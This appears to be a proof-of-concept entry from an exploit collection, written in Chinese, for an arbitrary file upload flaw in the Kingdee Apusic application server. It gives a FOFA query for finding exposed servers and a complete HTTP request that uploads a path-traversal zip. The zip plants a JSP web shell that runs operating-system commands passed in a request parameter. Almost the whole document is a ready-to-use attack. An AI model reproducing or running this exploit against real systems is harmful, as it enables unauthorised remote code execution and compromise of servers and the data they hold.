
## 金蝶Apusic应用服务器任意文件上传


## FOFA：
```
app="Apusic应用服务器"
fid="rqhtFwF4sIF7wTOroKTQGw=="
```

## exp
```
POST /admin//protect/application/deployApp HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryd9acIBdVuqKWDJbd
Accept-Encoding: gzip

------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="appName"
111
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="deployInServer"
false
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="clientFile"; filename="evil.zip"
Content-Type: application/x-zip-compressed

{{unquote("PK\x03\x04\x14\x00\x00\x00\x00\x00\xe5y\x09Uk\x0a\xc8\xe7d\x01\x00\x00d\x01\x00\x007\x00\x00\x00../../../../applications/default/public_html/shell2.jsp<%\x0d\x0a    if \x28\"admin\".equals\x28request.getParameter\x28\"pwd\"\x29\x29\x29 \x7b\x0d\x0a        java.io.InputStream input = Runtime.getRuntime\x28\x29.exec\x28request.getParameter\x28\"cmd\"\x29\x29.getInputStream\x28\x29;\x0d\x0a        int len = -1;\x0d\x0a        byte[] bytes = new byte[4092];\x0d\x0a        while \x28\x28len = input.read\x28bytes\x29\x29 != -1\x29 \x7b\x0d\x0a            out.println\x28new String\x28bytes, \"GBK\"\x29\x29;\x0d\x0a        \x7d\x0d\x0a    \x7d\x0d\x0a%>PK\x01\x02\x14\x03\x14\x00\x00\x00\x00\x00\xe5y\x09Uk\x0a\xc8\xe7d\x01\x00\x00d\x01\x00\x007\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb4\x81\x00\x00\x00\x00../../../../applications/default/public_html/shell2.jspPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00e\x00\x00\x00\xb9\x01\x00\x00\x00\x00")}}
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="archivePath"

------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="baseContext"

------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="startType"
auto
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="loadon"

------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="virtualHost"

------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="allowHosts"

------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="denyHosts"

------WebKitFormBoundaryd9acIBdVuqKWDJbd--

```

![b6943470264bdb2eced0931fe128785c](https://github.com/wy876/POC/assets/139549762/caf376a2-8465-4488-bf02-1b98978f698d)

![8b7fbfa7e8cc06d57908229d7dbcdc18](https://github.com/wy876/POC/assets/139549762/3d74fab1-af40-43af-a762-327860f67150)

